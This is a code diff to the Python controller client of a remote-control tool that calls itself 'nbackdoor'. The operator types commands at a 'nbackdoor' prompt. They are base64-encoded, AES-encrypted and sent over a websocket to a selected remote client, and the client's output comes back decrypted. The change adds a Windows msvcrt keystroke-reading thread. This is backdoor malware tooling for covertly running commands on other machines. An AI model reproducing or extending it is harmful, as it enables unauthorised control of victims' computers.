@@ -11,6 +11,7 @@ import time
 # from getpass import getpass
 from base64 import b64decode, b64encode
 import sys
+import msvcrt
 from websocket import create_connection
 from Crypto.Cipher import AES
 from _docpot import docopt
@@ -71,7 +72,10 @@ class ControllerClient:
                 # =======================
                 # ======= Command =======
                 # =======================
+                inputer = InputSender(self)
                 while not self.exit:
+                    inputer.stop = True
+
                     input_str = raw_input(Back.RED + 'nbackdoor' +
                                           ((' in ' + str(self.to_client) + '') if self.to_client is not None else '') +
                                           ':' + Back.RESET + ' ')
@@ -81,6 +85,8 @@ class ControllerClient:
 
                     msg = json.dumps({'cmd': b64encode(input_str)})
                     self.ws.send_binary(self.encrypt(msg))
+
+                    inputer.stop = False
 
                     msg_recv = json.loads(self.decrypt(self.ws.recv()))
                     if 'data' in msg_recv:
@@ -138,6 +144,7 @@ class InputSender(threading.Thread):
 
         self.client = client
         self.send_char = client.send_char
+        self.stop = True
 
         self.exit = False
         self.daemon = True
@@ -145,11 +152,11 @@ class InputSender(threading.Thread):
 
     def run(self):
         while not self.exit:
-            char = sys.stdin.read(1)
-            while char:
-                self.send_char(char)
+            while self.stop:
+                time.sleep(0.1)
 
-                char = sys.stdin.read(1)
+            char = msvcrt.getch()       #todo !!!!!!!!!!!!!!!!!!!!!!!!!!!!
+            self.send_char(char)
 
 
 def hostname():
